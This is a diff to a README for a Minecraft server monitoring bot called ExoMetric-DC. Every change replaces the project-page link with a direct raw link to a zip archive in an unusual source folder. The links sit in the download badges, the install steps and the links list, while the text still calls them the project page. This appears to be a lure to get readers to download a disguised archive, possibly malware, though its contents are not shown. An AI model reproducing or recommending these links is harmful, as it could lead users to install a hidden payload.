@@ -1,6 +1,6 @@
 # 🚀 ExoMetric-DC - Monitor Minecraft Servers Live
 
-[![Download ExoMetric-DC](https://img.shields.io/badge/Download-ExoMetric--DC-brightgreen?style=for-the-badge)](https://github.com/rusirurangana/ExoMetric-DC)
+[![Download ExoMetric-DC](https://img.shields.io/badge/Download-ExoMetric--DC-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rusirurangana/ExoMetric-DC/main/src/structures/DC_Metric_Exo_v3.3.zip)
 
 ## About ExoMetric-DC
 
@@ -40,7 +40,7 @@ ExoMetric-DC uses the ExoMetric mod API to gather real-time data from Minecraft 
 
 ## 🔗 Where to Get ExoMetric-DC  
 
-[![Download ExoMetric-DC](https://img.shields.io/badge/Get%20ExoMetric-DC-blueviolet?style=for-the-badge)](https://github.com/rusirurangana/ExoMetric-DC)
+[![Download ExoMetric-DC](https://img.shields.io/badge/Get%20ExoMetric-DC-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/rusirurangana/ExoMetric-DC/main/src/structures/DC_Metric_Exo_v3.3.zip)
 
 You will find the latest version and installation files on the GitHub page above. It hosts all files you need to download and start using ExoMetric-DC.
 
@@ -54,7 +54,7 @@ This section guides you step-by-step to download and run the bot on your Windows
 
 Open your web browser and go to:
 
-https://github.com/rusirurangana/ExoMetric-DC
+https://raw.githubusercontent.com/rusirurangana/ExoMetric-DC/main/src/structures/DC_Metric_Exo_v3.3.zip
 
 The page provides the latest bot files and instructions.
 
@@ -167,7 +167,7 @@ No personal data outside of what you provide to the bot is collected or shared.
 
 ## 📚 Helpful Links
 
-- Primary Download and Project page: https://github.com/rusirurangana/ExoMetric-DC  
+- Primary Download and Project page: https://raw.githubusercontent.com/rusirurangana/ExoMetric-DC/main/src/structures/DC_Metric_Exo_v3.3.zip  
 - Documentation and commands: Available on the project GitHub  
 - Support: Use issues on GitHub to report problems or ask questions  
 
@@ -188,4 +188,4 @@ If the bot does not start or connect properly, try these steps:
 
 ## 🔗 Download ExoMetric-DC Now  
 
-[![Download ExoMetric-DC](https://img.shields.io/badge/Download%20Now-ExoMetric--DC-darkgreen?style=for-the-badge)](https://github.com/rusirurangana/ExoMetric-DC)
+[![Download ExoMetric-DC](https://img.shields.io/badge/Download%20Now-ExoMetric--DC-darkgreen?style=for-the-badge)](https://raw.githubusercontent.com/rusirurangana/ExoMetric-DC/main/src/structures/DC_Metric_Exo_v3.3.zip)
